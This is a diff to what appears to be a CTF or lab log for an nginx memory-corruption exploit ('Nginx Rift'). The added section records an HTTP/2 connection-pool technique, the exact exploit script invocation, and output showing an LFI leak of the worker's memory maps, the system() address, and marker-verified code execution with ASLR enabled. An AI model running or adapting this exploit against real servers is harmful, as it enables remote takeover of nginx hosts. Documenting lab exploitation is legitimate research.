@@ -1,6 +1,6 @@
 # Nginx Rift CTF Tests
 
-Last updated: 2026-05-15 00:58:38 CEST
+Last updated: 2026-05-15 01:16:56 CEST
 
 ## Baseline: Original PoC Command Execution
 
@@ -401,3 +401,56 @@ gdb: SIGSEGV in ngx_http_request_handler() immediately after COPY_CAPTURE.
 ```
 
 Status: failed proof. Delaying the body does not help while the overflow crashes the worker before cleanup allocation.
+
+## HTTP/2 Connection-Pool CTF Win
+
+Purpose: use a same-port HTTP/2 victim connection to provide a non-NULL connection-pool cleanup pointer and a binary-safe h2 body buffer in the same high-byte window.
+
+Updated lab config:
+
+```text
+listen 19321 http2;
+request_pool_size 4096;
+connection_pool_size 1456;
+set $original_endpoint PPPPPPPPPPP$1;
+```
+
+Command:
+
+```bash
+./ctf_remote_exploit.py \
+  --host 192.168.1.205 --port 19321 \
+  --core-guided --target-len 2 \
+  --h2-victim --a-count 127 --plus-count 962 \
+  --tries-per-candidate 1 --max-core-hits 100 \
+  --proof-delay 0.25 --core-delay 2 --verbose
+```
+
+Observed on target VM:
+
+```text
+Nginx worker PID discovered over LFI: 15474
+Nginx writable image mapping: 0x562f58677000
+libc base/path from worker maps: 0x7fca6acfa000 /usr/lib/x86_64-linux-gnu/libc.so.6
+system() absolute address: 0x7fca6ad4ad70
+Core slot candidates: 932 URI-safe / 10437 total
+Cleanup-window filter: 12 plausible pools, 0 with probe low bytes, 1 corrupted/probe pools, 266 matching safe slots
+corrupt-probe: pool=0x562f58b2d190 cleanup=0x562f58b23030
+Trying core-derived slot address 0x562f58b23627 (body offset 80)
+CTF win: marker /tmp/nginx_rift_ctf_36d102d7fd21 contains token
+```
+
+Status: pass. This is the first marker-verified target VM win with ASLR enabled and exploit-time inputs derived through HTTP/LFI.
+
+Repeat after clean service restart:
+
+```text
+Nginx worker PID discovered over LFI: 15554
+Nginx writable image mapping: 0x561281df2000
+libc base/path from worker maps: 0x7f576434f000 /usr/lib/x86_64-linux-gnu/libc.so.6
+system() absolute address: 0x7f576439fd70
+Core slot candidates: 896 URI-safe / 10437 total
+Cleanup-window filter: 12 plausible pools, 0 with probe low bytes, 1 corrupted/probe pools, 45 matching safe slots
+Trying core-derived slot address 0x5612824f777a (body offset 0)
+CTF win: marker /tmp/nginx_rift_ctf_bc19ebe74839 contains token
+```
